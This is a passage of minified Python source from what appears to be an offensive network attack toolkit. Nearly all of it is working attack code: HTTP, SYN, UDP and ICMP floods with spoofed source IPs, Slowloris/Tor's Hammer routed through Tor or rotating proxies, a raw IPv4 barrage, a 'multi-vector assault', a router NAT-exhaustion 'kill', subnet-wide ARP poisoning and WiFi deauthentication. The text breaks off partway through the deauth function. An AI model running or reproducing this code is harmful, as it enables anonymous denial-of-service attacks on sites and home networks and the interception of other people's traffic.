			host,port_str=addr.rsplit(_D,1)
			try:port=int(port_str)
			except ValueError:port=9050
		else:host=addr;port=9050
		self.add_proxy(ptype,host,port,f"Custom: {address}")
	def get_next_proxy(self):
		with self.lock:
			if not self.proxies:return
			total=len(self.proxies)
			for _ in range(total):
				proxy=self.proxies[self.current_index];self.current_index=(self.current_index+1)%total
				if proxy[_A3]and proxy[_r]<3:return proxy
			for p in self.proxies:p[_r]=0;p[_A3]=_B
			return self.proxies[0]if self.proxies else _C
	def mark_failure(self,proxy):
		with self.lock:
			proxy[_r]+=1
			if proxy[_r]>=5:proxy[_A3]=_E
	def list_proxies(self):
		if not self.proxies:print('    (no proxies configured)');return
		print('\n    ┌─ Active Proxy Pool ─────────────────────────────┐')
		for(i,p)in enumerate(self.proxies):status='✓'if p[_A3]else'✗';print(f"    │ {status} [{p[_AJ]:>6}] {p[_AK]}:{p[_AL]:<6} failures={p[_r]}  {p["desc"]}")
		print('    └──────────────────────────────────────────────────┘')
	def create_socket(self,target_type='tcp'):
		proxy=self.get_next_proxy()
		if proxy is _C or not SOCKS_AVAILABLE:
			if target_type=='tcp':return socket.socket(socket.AF_INET,socket.SOCK_STREAM),_C
			else:return socket.socket(socket.AF_INET,socket.SOCK_DGRAM),_C
		try:
			ptype=proxy[_AJ]
			if ptype in(_d,'socks4','socks'):socks_ver=socks_module.SOCKS5 if ptype==_d else socks_module.SOCKS4;sock=socks_module.socksocket();sock.set_proxy(socks_ver,proxy[_AK],proxy[_AL]);return sock,proxy
			elif ptype==_A4:sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);return sock,proxy
			else:sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);return sock,proxy
		except Exception:self.mark_failure(proxy);sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);return sock,_C
def resolve_target(host,target_type):
	A='localhost';host=host.replace('https://','').replace('http://','');host=host.replace('www.','').rstrip('/').strip()
	if target_type==_K:
		try:socket.inet_aton(host);return host,host
		except OSError:
			if host.lower()==A:return _T,A
			print(f"[!] '{host}' is not a valid IPv4 address.");raise SystemExit(1)
	try:ip=socket.gethostbyname(host);print(f"[OK] Resolved → {host} → {ip}");return ip,host
	except socket.gaierror:print(f"[X] Cannot resolve '{host}'");raise SystemExit(2)
def tcp_connect_scan(ip,port,timeout=SOCKET_TIMEOUT):
	try:sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);sock.settimeout(timeout);result=sock.connect_ex((ip,port));sock.close();return port if result==0 else _C
	except Exception:return
def syn_stealth_scan(ip,port,timeout=2.):
	if IS_WINDOWS:return
	try:
		send_sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP);send_sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1);recv_sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP);recv_sock.settimeout(timeout);source_port=random.randint(1024,65535);seq_num=random.randint(0,4294967295);ip_ver,ip_ihl=4,5;ip_tot_len=40;ip_id=random.randint(0,65535);ip_ttl=64;ip_src=socket.inet_aton(random_ipv4());ip_dst=socket.inet_aton(ip);ip_header=struct.pack(_W,(ip_ver<<4)+ip_ihl,0,ip_tot_len,ip_id,0,ip_ttl,socket.IPPROTO_TCP,0,ip_src,ip_dst);ip_header=struct.pack(_W,(ip_ver<<4)+ip_ihl,0,ip_tot_len,ip_id,0,ip_ttl,socket.IPPROTO_TCP,checksum(ip_header),ip_src,ip_dst);tcp_offset=5;tcp_flags=2;tcp_win=5840;tcp_header=struct.pack(_s,source_port,port,seq_num,0,tcp_offset<<4,tcp_flags,tcp_win,0,0);pseudo=struct.pack(_AW,ip_src,ip_dst,0,socket.IPPROTO_TCP,len(tcp_header));tcp_checksum_val=checksum(pseudo+tcp_header);tcp_header=struct.pack(_s,source_port,port,seq_num,0,tcp_offset<<4,tcp_flags,tcp_win,tcp_checksum_val,0);packet=ip_header+tcp_header;send_sock.sendto(packet,(ip,0))
		while _B:
			try:
				data,addr=recv_sock.recvfrom(1024)
				if addr[0]==ip:
					tcp_flags_byte=data[33]
					if tcp_flags_byte&18==18:send_sock.close();recv_sock.close();return port
			except socket.timeout:break
		send_sock.close();recv_sock.close();return
	except PermissionError:return
	except Exception:return
def scan_ports(ip,ports=_C,stealth=_E,workers=100):
	ports=ports or DEFAULT_PORTS
	if IS_WINDOWS and stealth:print('[!] Windows restricts raw sockets — using TCP connect scan.');stealth=_E
	if stealth and not check_root():print('[!] Root required for SYN scan — falling back to TCP connect.');stealth=_E
	scan_func=syn_stealth_scan if stealth else tcp_connect_scan;scan_mode='SYN stealth'if stealth else'TCP connect';print(f"\n[*] Scanning {len(ports)} ports on {ip} ({scan_mode} mode)...");open_ports=[]
	with ThreadPoolExecutor(max_workers=min(workers,200))as executor:
		futures={executor.submit(scan_func,ip,port):port for port in ports}
		for future in as_completed(futures):
			result=future.result()
			if result:open_ports.append(result);print(f"    [OPEN] Port {result}")
	if not open_ports:print('    [!] No open ports found.')
	else:print(f"\n[OK] {len(open_ports)} open ports: {sorted(open_ports)}")
	return sorted(open_ports)
def pick_port(open_ports):
	if not open_ports:return ask_port_manual()
	if len(open_ports)==1:print(f"[*] Auto‑selected Port {open_ports[0]}");return open_ports[0]
	for(i,p)in enumerate(open_ports,1):print(f"    {i}. Port {p}")
	while _B:
		choice=input('    Pick number (Enter = first): ').strip()
		if not choice:return open_ports[0]
		try:
			idx=int(choice)-1
			if 0<=idx<len(open_ports):return open_ports[idx]
		except ValueError:pass
		print('    [!] Invalid choice.')
def ask_port_manual():
	while _B:
		p=input('\n[+] Target port [80]: ').strip()
		if not p:return 80
		try:
			port=int(p)
			if 1<=port<=65535:return port
		except ValueError:pass
		print('[!] Enter a valid port (1‑65535).')
def http_flood_worker(ip,port,host,use_ssl=_E,proxy_mgr=_C):
	if stop_event.is_set():return
	sock=_C
	try:
		if proxy_mgr and proxy_mgr.proxies:sock,proxy_info=proxy_mgr.create_socket('tcp')
		else:sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);proxy_info=_C
		sock.settimeout(3);sock.connect((ip,port))
		if use_ssl:import ssl;context=ssl.create_default_context();context.check_hostname=_E;context.verify_mode=ssl.CERT_NONE;sock=context.wrap_socket(sock,server_hostname=host)
		path=random_path();ua=random.choice(USER_AGENTS);referer=random_referer(host);method=random.choice(['GET','HEAD','POST','PUT','DELETE','OPTIONS']);payload=f"""{method} {path} HTTP/1.1\r
Host: {host}\r
User-Agent: {ua}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.9\r
Accept-Encoding: gzip, deflate, br\r
Referer: {referer}\r
Cache-Control: no-cache\r
Pragma: no-cache\r
Connection: close\r
X-Forwarded-For: {random_ipv4()}\r
\r
""";sock.send(payload.encode());sock.recv(4096);increment_packets(1,len(payload))
	except Exception:
		if proxy_mgr and'proxy_info'in locals()and proxy_info:proxy_mgr.mark_failure(proxy_info)
	finally:
		try:sock.close()
		except Exception:pass
def http_flood(ip,port,host,threads,use_ssl=_E,proxy_mgr=_C):
	print(f"\n[*] HTTP Flood → {host}:{port} | Workers: {threads} | SSL: {use_ssl} | Proxies: {len(proxy_mgr.proxies)if proxy_mgr else 0}");print(_A5);threading.Thread(target=stats_reporter,args=(2.,),daemon=_B).start()
	with ThreadPoolExecutor(max_workers=threads)as executor:
		futures=[executor.submit(_http_flood_loop,ip,port,host,use_ssl,proxy_mgr)for _ in range(threads)]
		try:
			for f in as_completed(futures):f.result()
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Interrupted. {format_rate()}")
def _http_flood_loop(ip,port,host,use_ssl,proxy_mgr=_C):
	while not stop_event.is_set():http_flood_worker(ip,port,host,use_ssl,proxy_mgr)
def syn_flood_worker(ip,port):
	if stop_event.is_set()or IS_WINDOWS:return
	sock=_C
	try:sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP);sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1);src_ip=random_ipv4();src_port=random.randint(1024,65535);seq_num=random.randint(0,4294967295);ip_ver,ip_ihl=4,5;ip_tot_len=40;ip_id=random.randint(0,65535);ip_ttl=random.randint(32,255);ip_src_bytes=socket.inet_aton(src_ip);ip_dst_bytes=socket.inet_aton(ip);ip_header=struct.pack(_W,(ip_ver<<4)+ip_ihl,0,ip_tot_len,ip_id,0,ip_ttl,socket.IPPROTO_TCP,0,ip_src_bytes,ip_dst_bytes);ip_header=struct.pack(_W,(ip_ver<<4)+ip_ihl,0,ip_tot_len,ip_id,0,ip_ttl,socket.IPPROTO_TCP,checksum(ip_header),ip_src_bytes,ip_dst_bytes);tcp_offset=5;tcp_flags=2;tcp_win=random.randint(1024,65535);tcp_header=struct.pack(_s,src_port,port,seq_num,0,tcp_offset<<4,tcp_flags,tcp_win,0,0);pseudo=struct.pack(_AW,ip_src_bytes,ip_dst_bytes,0,socket.IPPROTO_TCP,len(tcp_header));tcp_checksum_val=checksum(pseudo+tcp_header);tcp_header=struct.pack(_s,src_port,port,seq_num,0,tcp_offset<<4,tcp_flags,tcp_win,tcp_checksum_val,0);packet=ip_header+tcp_header;sock.sendto(packet,(ip,0));increment_packets(1,len(packet))
	except PermissionError:print('[X] SYN Flood requires ROOT privileges!');stop_event.set()
	except Exception:pass
	finally:
		try:sock.close()
		except Exception:pass
def syn_flood(ip,port,threads):
	if IS_WINDOWS:print('[X] SYN Flood (raw sockets) is NOT available on Windows.');print('[*] Windows restricts raw socket creation since XP SP2.');print('[*] Use HTTP Flood or UDP Flood instead.');return
	if not check_root():print('[X] SYN Flood requires ROOT privileges. Aborting.');return
	print(f"\n[*] SYN Flood → {ip}:{port} | Workers: {threads} | Spoofed IPs: ON");print(_A5);threading.Thread(target=stats_reporter,args=(2.,),daemon=_B).start()
	with ThreadPoolExecutor(max_workers=threads)as executor:
		futures=[executor.submit(_syn_flood_loop,ip,port)for _ in range(threads)]
		try:
			for f in as_completed(futures):f.result()
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Interrupted. {format_rate()}")
def _syn_flood_loop(ip,port):
	while not stop_event.is_set():syn_flood_worker(ip,port)
def udp_flood_worker(ip,port,payload_size=1024):
	if stop_event.is_set():return
	sock=_C
	try:sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);actual_size=random.randint(max(1,payload_size//2),payload_size);data=random.randbytes(actual_size);sock.sendto(data,(ip,port));increment_packets(1,len(data))
	except Exception:pass
	finally:
		try:sock.close()
		except Exception:pass
def udp_flood(ip,port,threads,payload_size=1024):
	print(f"\n[*] UDP Flood → {ip}:{port} | Workers: {threads} | Payload: ~{payload_size}B");print(_A5);threading.Thread(target=stats_reporter,args=(2.,),daemon=_B).start()
	with ThreadPoolExecutor(max_workers=threads)as executor:
		futures=[executor.submit(_udp_flood_loop,ip,port,payload_size)for _ in range(threads)]
		try:
			for f in as_completed(futures):f.result()
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Interrupted. {format_rate()}")
def _udp_flood_loop(ip,port,payload_size):
	while not stop_event.is_set():udp_flood_worker(ip,port,payload_size)
def icmp_flood_worker(ip,payload_size=64):
	A='!BBHHH'
	if stop_event.is_set()or IS_WINDOWS:return
	sock=_C
	try:sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP);icmp_type,icmp_code=8,0;icmp_id=random.randint(0,65535);icmp_seq=random.randint(0,65535);actual_size=random.randint(max(8,payload_size//2),payload_size);payload=random.randbytes(actual_size);icmp_header=struct.pack(A,icmp_type,icmp_code,0,icmp_id,icmp_seq);icmp_checksum_val=checksum(icmp_header+payload);icmp_header=struct.pack(A,icmp_type,icmp_code,icmp_checksum_val,icmp_id,icmp_seq);sock.sendto(icmp_header+payload,(ip,0));increment_packets(1,len(icmp_header)+len(payload))
	except PermissionError:print('[X] ICMP Flood requires ROOT privileges!');stop_event.set()
	except Exception:pass
	finally:
		try:sock.close()
		except Exception:pass
def icmp_flood(ip,threads,payload_size=64):
	if IS_WINDOWS:print('[X] ICMP Flood (raw ICMP sockets) is NOT available on Windows.');print('[*] Use UDP Flood instead — it works on all platforms.');return
	if not check_root():print('[X] ICMP Flood requires ROOT privileges. Aborting.');return
	print(f"\n[*] ICMP Flood → {ip} | Workers: {threads} | Payload: ~{payload_size}B");print(_A5);threading.Thread(target=stats_reporter,args=(2.,),daemon=_B).start()
	with ThreadPoolExecutor(max_workers=threads)as executor:
		futures=[executor.submit(_icmp_flood_loop,ip,payload_size)for _ in range(threads)]
		try:
			for f in as_completed(futures):f.result()
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Interrupted. {format_rate()}")
def _icmp_flood_loop(ip,payload_size):
	while not stop_event.is_set():icmp_flood_worker(ip,payload_size)
def tors_hammer_worker(ip,port,host,use_ssl=_E,use_tor=_E,delay_ms=500,proxy_mgr=_C,keepalive=_B):
	if stop_event.is_set():return
	sock=_C
	try:
		if use_tor or proxy_mgr and proxy_mgr.proxies:
			if proxy_mgr and proxy_mgr.proxies and not use_tor:sock,proxy_info=proxy_mgr.create_socket('tcp')
			elif SOCKS_AVAILABLE:
				sock=socks_module.socksocket()
				if use_tor:sock.set_proxy(socks_module.SOCKS5,_T,9050)
				proxy_info={_AJ:_d,_AK:_T,_AL:9050}
			else:sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);proxy_info=_C
		else:sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);proxy_info=_C
		sock.settimeout(SLOWLORIS_SOCKET_TIMEOUT);sock.connect((ip,port))
		if use_ssl:import ssl;context=ssl.create_default_context();context.check_hostname=_E;context.verify_mode=ssl.CERT_NONE;sock=context.wrap_socket(sock,server_hostname=host)
		path=random_path();ua=random.choice(USER_AGENTS);content_length=random.randint(5000,50000);initial=f"""POST {path} HTTP/1.1\r
Host: {host}\r
User-Agent: {ua}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate, br\r
Connection: keep-alive\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {content_length}\r
X-Forwarded-For: {random_ipv4()}\r
""";sock.send(initial.encode());increment_packets(1,len(initial))
		for _ in range(random.randint(3,8)):
			if stop_event.is_set():break
			header=f"X-Additive-{random.randint(0,99999)}: {random.randbytes(random.randint(16,64)).hex()}\r\n";sock.send(header.encode());increment_packets(1,len(header));time.sleep(random.uniform(delay_ms/1000,delay_ms*2.5/1000))
		while not stop_event.is_set()and keepalive:chunk_size=random.randint(8,64);body_chunk=random.randbytes(chunk_size);sock.send(body_chunk);increment_packets(1,chunk_size);time.sleep(random.uniform(delay_ms/1000,delay_ms*3/1000))
	except(socket.timeout,ConnectionRefusedError,ConnectionResetError,BrokenPipeError,OSError):pass
	except Exception:pass
	finally:
		try:sock.close()
		except Exception:pass
def tors_hammer(ip,port,host,threads,use_ssl=_E,use_tor=_E,delay_ms=500,proxy_mgr=_C,ramp_up=_B):
	mode="Tor's Hammer (via Tor)"if use_tor else'Slowloris (direct)'
	if proxy_mgr and proxy_mgr.proxies and not use_tor:mode=f"Slowloris ({len(proxy_mgr.proxies)} proxies)"
	print(f"\n[*] {mode} → {host}:{port} | Workers: {threads} | Delay: {delay_ms}ms | SSL: {use_ssl}");print('[*] ADDITIVE mode: connections accumulate over time');print(_A6);threading.Thread(target=stats_reporter,args=(3.,),daemon=_B).start()
	with ThreadPoolExecutor(max_workers=threads)as executor:
		futures=[];launched=0
		if ramp_up:
			ramp_steps=min(threads,50);step_size=max(1,threads//ramp_steps)
			for batch in range(ramp_steps):
				if stop_event.is_set():break
				batch_count=min(step_size,threads-launched)
				for _ in range(batch_count):
					if stop_event.is_set():break
					f=executor.submit(_tors_hammer_loop,ip,port,host,use_ssl,use_tor,delay_ms,proxy_mgr);futures.append(f);launched+=1
				print(f"    [+] Active connections: {launched}/{threads}");time.sleep(.4)
		else:
			for _ in range(threads):f=executor.submit(_tors_hammer_loop,ip,port,host,use_ssl,use_tor,delay_ms,proxy_mgr);futures.append(f);launched+=1
		print(f"    [+] All {launched} connections launched. Accumulating...")
		try:
			for f in as_completed(futures):f.result()
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Interrupted. {format_rate()}")
def _tors_hammer_loop(ip,port,host,use_ssl,use_tor,delay_ms,proxy_mgr=_C):
	while not stop_event.is_set():tors_hammer_worker(ip,port,host,use_ssl,use_tor,delay_ms,proxy_mgr);time.sleep(random.uniform(.05,.3))
def ipv4_raw_worker(target_ip,target_ports):
	if stop_event.is_set()or IS_WINDOWS:return
	sock=_C
	try:
		try:sock=socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.ntohs(3))
		except(AttributeError,OSError):sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW);sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
		port=random.choice(target_ports);src_ip=random_ipv4();ip_src_bytes=socket.inet_aton(src_ip);ip_dst_bytes=socket.inet_aton(target_ip);attack_type=random.choice([_A7,'udp','raw'])
		if attack_type==_A7:ip_ver,ip_ihl=4,5;ip_tot_len=40;ip_id=random.randint(0,65535);ip_ttl=random.randint(48,255);ip_header=struct.pack(_W,(ip_ver<<4)+ip_ihl,0,ip_tot_len,ip_id,0,ip_ttl,socket.IPPROTO_TCP,0,ip_src_bytes,ip_dst_bytes);ip_header=struct.pack(_W,(ip_ver<<4)+ip_ihl,0,ip_tot_len,ip_id,0,ip_ttl,socket.IPPROTO_TCP,checksum(ip_header),ip_src_bytes,ip_dst_bytes);src_port=random.randint(1,65535);seq=random.randint(0,4294967295);tcp_hdr=struct.pack(_s,src_port,port,seq,0,80,2,65535,0,0);pseudo=struct.pack(_AW,ip_src_bytes,ip_dst_bytes,0,socket.IPPROTO_TCP,len(tcp_hdr));tcp_hdr=struct.pack(_s,src_port,port,seq,0,80,checksum(pseudo+tcp_hdr),65535,0,0);packet=ip_header+tcp_hdr
		elif attack_type=='udp':udp_payload_len=random.randint(0,1024);ip_tot_len=28+udp_payload_len;ip_id=random.randint(0,65535);ip_ttl=random.randint(48,255);ip_header=struct.pack(_W,69,0,ip_tot_len,ip_id,0,ip_ttl,socket.IPPROTO_UDP,0,ip_src_bytes,ip_dst_bytes);ip_header=struct.pack(_W,69,0,ip_tot_len,ip_id,0,ip_ttl,socket.IPPROTO_UDP,checksum(ip_header),ip_src_bytes,ip_dst_bytes);udp_len=ip_tot_len-20;udp_hdr=struct.pack('!HHH',random.randint(1,65535),port,udp_len);payload=random.randbytes(max(0,udp_len-8));packet=ip_header+udp_hdr+payload
		else:payload_size=random.randint(40,1500);ip_tot_len=20+payload_size;ip_id=random.randint(0,65535);ip_ttl=random.randint(32,255);raw_proto=random.randint(1,255);ip_header=struct.pack(_W,69,0,ip_tot_len,ip_id,0,ip_ttl,raw_proto,0,ip_src_bytes,ip_dst_bytes);ip_header=struct.pack(_W,69,0,ip_tot_len,ip_id,0,ip_ttl,raw_proto,checksum(ip_header),ip_src_bytes,ip_dst_bytes);packet=ip_header+random.randbytes(payload_size)
		sock.sendto(packet,(target_ip,0));increment_packets(1,len(packet))
	except PermissionError:print('[X] IPv4 Raw Attack requires ROOT privileges!');stop_event.set()
	except Exception:pass
	finally:
		try:sock.close()
		except Exception:pass
def ipv4_raw_attack(ip,threads):
	if IS_WINDOWS:print(_Af);return
	if not check_root():print('[X] IPv4 Raw Attack requires ROOT privileges. Aborting.');return
	print(f"\n[*] IPv4 RAW NETWORK ATTACK → {ip}");print('[*] Phase 1: Auto‑detecting open ports...');open_ports=scan_ports(ip,stealth=_B)
	if not open_ports:print('[!] No open ports detected. Using common ports.');open_ports=[80,443,53,22,25,8080,8443]
	print(f"\n[*] Phase 2: INFINITE raw packet barrage on {len(open_ports)} ports");print(f"    Target ports: {open_ports}");print(f"    Workers: {threads} | Spoofed IPs: ON | Mixed: TCP SYN + UDP + Raw IP");print(_A5);threading.Thread(target=stats_reporter,args=(1.5,),daemon=_B).start()
	with ThreadPoolExecutor(max_workers=threads)as executor:
		futures=[executor.submit(_ipv4_raw_loop,ip,open_ports)for _ in range(threads)]
		try:
			for f in as_completed(futures):f.result()
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Interrupted. {format_rate()}")
def _ipv4_raw_loop(ip,ports):
	while not stop_event.is_set():ipv4_raw_worker(ip,ports)
def multi_vector_assault(ip,port,host,threads,use_ssl=_E,proxy_mgr=_C):
	total_threads=threads;http_threads=total_threads//3;udp_threads=total_threads//3;slowloris_threads=max(1,total_threads//6);icmp_threads=max(1,total_threads-http_threads-udp_threads-slowloris_threads);can_icmp=not IS_WINDOWS and check_root()
	if not can_icmp:udp_threads+=icmp_threads;icmp_threads=0
	print(f"\n[*] MULTI‑VECTOR ASSAULT → {host}:{port}");print(f"    ├─ HTTP Flood:     {http_threads} workers");print(f"    ├─ UDP Flood:      {udp_threads} workers");print(f"    ├─ Slowloris:      {slowloris_threads} workers (ADDITIVE)");print(f"    └─ ICMP Flood:     {icmp_threads} workers {"(skipped on Windows)"if IS_WINDOWS else""}");print('[*] ALL vectors run INFINITE — press Ctrl+C to stop\n');threading.Thread(target=stats_reporter,args=(2.,),daemon=_B).start()
	with ThreadPoolExecutor(max_workers=total_threads)as executor:
		futures=[]
		for _ in range(http_threads):futures.append(executor.submit(_http_flood_loop,ip,port,host,use_ssl,proxy_mgr))
		for _ in range(udp_threads):futures.append(executor.submit(_udp_flood_loop,ip,port,1024))
		for _ in range(slowloris_threads):futures.append(executor.submit(_tors_hammer_loop,ip,port,host,use_ssl,_E,500,proxy_mgr))
		if can_icmp:
			for _ in range(icmp_threads):futures.append(executor.submit(_icmp_flood_loop,ip,64))
		try:
			for f in as_completed(futures):f.result()
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Interrupted. {format_rate()}")
def router_connection_kill(router_ip,threads=200):
	global router_disruption_active
	if not router_ip:
		router_ip=get_default_gateway()
		if not router_ip:print('[X] Could not detect router IP. Please specify manually.');return
	print(f"\n╔══════════════════════════════════════════════════════════════╗");print(f"║          ROUTER CONNECTION KILL — TARGET: {router_ip:<15} ║");print(f"╚══════════════════════════════════════════════════════════════╝");print(f"\n[*] This attack will STOP the router from forwarding traffic");print(f"[*] while maintaining YOUR connection to the network.");print(f"[*] Techniques: NAT exhaustion + CPU saturation + bandwidth hog");print(f"[*] Your IP: {get_local_ip()} | Router IP: {router_ip}");print(f"[*] Workers: {threads} | Running INFINITE — Ctrl+C to stop\n");router_disruption_active=_B;threading.Thread(target=stats_reporter,args=(2.,),daemon=_B).start()
	def nat_table_exhaustion_worker():
		while not stop_event.is_set()and router_disruption_active:
			try:sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);sock.settimeout(.5);dst_ip=f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}";dst_port=random.randint(1,65535);sock.connect_ex((dst_ip,dst_port));sock.close();increment_packets(1)
			except Exception:pass
	def cpu_saturation_worker():
		while not stop_event.is_set()and router_disruption_active:
			try:sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);port=random.choice([53,80,443,8080,1900,5353,5000]+list(range(40000,60000)));data=random.randbytes(random.randint(1,64));sock.sendto(data,(router_ip,port));sock.close();increment_packets(1,len(data))
			except Exception:pass
	def bandwidth_hog_worker():
		while not stop_event.is_set()and router_disruption_active:
			try:sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);data=random.randbytes(random.randint(1024,1400));sock.sendto(data,(router_ip,random.randint(1,65535)));sock.close();increment_packets(1,len(data))
			except Exception:pass
	with ThreadPoolExecutor(max_workers=threads)as executor:
		futures=[];nat_threads=threads//3;cpu_threads=threads//3;bw_threads=threads-nat_threads-cpu_threads
		for _ in range(nat_threads):futures.append(executor.submit(lambda:_infinite_loop(nat_table_exhaustion_worker)))
		for _ in range(cpu_threads):futures.append(executor.submit(lambda:_infinite_loop(cpu_saturation_worker)))
		for _ in range(bw_threads):futures.append(executor.submit(lambda:_infinite_loop(bandwidth_hog_worker)))
		print(f"    [+] NAT Exhaustion: {nat_threads} | CPU Saturation: {cpu_threads} | Bandwidth Hog: {bw_threads}\n")
		try:
			for f in as_completed(futures):f.result()
		except KeyboardInterrupt:stop_event.set();router_disruption_active=_E;print(f"\n[!] Router disruption stopped. {format_rate()}")
def _infinite_loop(worker_func):
	while not stop_event.is_set():worker_func()
def arp_spoof_attack(target_ip,router_ip=_C,gateway_ip=_C):
	B='all';A='/proc/sys/net/ipv4/ip_forward'
	if IS_WINDOWS:print('[X] ARP Spoofing is NOT available on Windows.');print('[*] This requires Scapy with raw socket/L2 access (Linux only).');return
	if not SCAPY_AVAILABLE:print('[X] Scapy is required for ARP spoofing. Install with: pip install scapy');return
	if not check_root():print('[X] ARP Spoofing requires ROOT privileges.');return
	if not router_ip:router_ip=get_default_gateway()
	if not router_ip:print('[X] Could not detect router IP.');return
	if not target_ip:target_ip=input(_Ag).strip()
	local_mac=get_local_mac();local_ip=get_local_ip();print(f"\n╔══════════════════════════════════════════════════════════════╗");print(f"║              ARP SPOOFING / POISONING ATTACK                ║");print(f"╚══════════════════════════════════════════════════════════════╝");print(f"\n[*] Your IP: {local_ip} | MAC: {local_mac} | Router: {router_ip} | Target: {target_ip}");print(_A6)
	try:
		with open(A,'w')as f:f.write(_N)
		print('[OK] IP forwarding enabled.')
	except Exception:print('[!] Could not enable IP forwarding.')
	def poison_target():
		while not stop_event.is_set():
			try:arp_response=ARP(op=2,pdst=target_ip,hwdst=_Y,psrc=router_ip,hwsrc=local_mac);send(arp_response,verbose=0);arp_response2=ARP(op=2,pdst=router_ip,hwdst=_Y,psrc=target_ip,hwsrc=local_mac);send(arp_response2,verbose=0);increment_packets(2);time.sleep(1)
			except Exception:pass
	def poison_subnet():
		parts=router_ip.split('.');subnet_base=f"{parts[0]}.{parts[1]}.{parts[2]}"
		while not stop_event.is_set():
			for i in range(2,255):
				if stop_event.is_set():break
				target=f"{subnet_base}.{i}"
				if target==local_ip or target==router_ip:continue
				try:arp_response=ARP(op=2,pdst=target,hwdst=_Y,psrc=router_ip,hwsrc=local_mac);send(arp_response,verbose=0);increment_packets(1)
				except Exception:pass
			time.sleep(2)
	try:
		if target_ip.lower()==B:poison_subnet()
		else:poison_target()
	except KeyboardInterrupt:
		stop_event.set();print(f"\n[!] ARP spoofing stopped. Restoring ARP tables...")
		try:
			if target_ip.lower()!=B:
				restore=ARP(op=2,pdst=target_ip,hwdst=_Y,psrc=router_ip,hwsrc=_Y)
				for _ in range(5):send(restore,verbose=0);time.sleep(.2)
		except Exception:pass
		try:
			with open(A,'w')as f:f.write('0')
		except Exception:pass
		print('[OK] Cleanup complete.')
def wifi_deauth_attack_windows(target_ssid=_C):
	print(f"\n╔══════════════════════════════════════════════════════════════╗");print(f"║        WiFi DEAUTHENTICATION ATTACK (Windows netsh)         ║");print(f"╚══════════════════════════════════════════════════════════════╝")
	if not check_root():print('[!] NOTE: Running without Administrator privileges.');print('[!] Some operations may fail. Run as Administrator for best results.\n')
	print('[*] Scanning for WiFi networks...');networks=scan_wifi_networks()
	if networks:
		print(f"\n[*] Found {len(networks)} networks:");seen=set()
		for(i,net)in enumerate(networks):
			ssid=net.get(_G,_Ah)
			if ssid in seen:continue
			seen.add(ssid);bssid=net.get(_I,_H);ch=net.get(_Q,_H);sig=net.get(_V,_H);vendor=get_oui_lookup(bssid);print(f"    {i+1:>2}. {ssid:<30} BSSID: {bssid}  Ch: {ch}  Sig: {sig}  [{vendor}]")
	if not target_ssid:
		current=get_current_wifi_info()
		if current and current.get(_G):
			print(f"\n[*] Currently connected to: '{current[_G]}'");use_current=input(f"    Target this network? (y/n) [y]: ").strip().lower()
			if use_current!='n':target_ssid=current[_G]
	if not target_ssid:
		target_ssid=input('\n[+] Target SSID to deauth: ').strip()
		if not target_ssid:print(_Ai);return
	print(f"\n[*] Target SSID: {target_ssid}");print(f"[*] Method: netsh wlan disconnect (persistent)");print(f"[*] Effect: Connected clients will be repeatedly kicked off");print(f"[*]");print(f"[*] This works by rapidly disconnecting from the target network.");print(f"[*] If you're connected to '{target_ssid}', your WiFi will disconnect too.");print(f"[*] To target OTHER clients, you must be connected to the same network.");print(f"[*]");print(f"[*] Advanced: For raw 802.11 deauth frames, install Npcap + Scapy.");print(f"[*] Running INFINITE — press Ctrl+C to stop\n");disconnect_count=0
	def deauth_loop():
		nonlocal disconnect_count
		while not stop_event.is_set():
			try:
				subprocess.run([_AD,_AF,'disconnect'],capture_output=_B,timeout=3);disconnect_count+=1;increment_packets(1)
				if disconnect_count%10==0:print(f"    [*] Deauth attempts: {disconnect_count}")
				time.sleep(1.5)
			except Exception:time.sleep(.5)
	try:deauth_loop()
	except KeyboardInterrupt:stop_event.set();print(f"\n[!] Windows WiFi deauth stopped. {disconnect_count} disconnects sent.")
def wifi_deauth_attack_scapy(target_bssid=_C,client_mac=_C,interface=_C,channel=_C):
	B='name';A='description'
	if not SCAPY_AVAILABLE:
		print('[X] Scapy is required for raw deauth frames.')
		if IS_WINDOWS:print('[*] Install Scapy and Npcap: pip install scapy');print('[*] Then download Npcap from: https://npcap.com/');print('[*] Falling back to netsh‑based deauth...');wifi_deauth_attack_windows();return
		print('[X] Install with: pip install scapy');return
	if not check_root():print('[X] WiFi Deauth requires ROOT/Administrator privileges.');return
	print(f"\n╔══════════════════════════════════════════════════════════════╗");print(f"║        WiFi DEAUTHENTICATION ATTACK (Scapy raw 802.11)      ║");print(f"╚══════════════════════════════════════════════════════════════╝");networks=scan_wifi_networks()
	if networks:
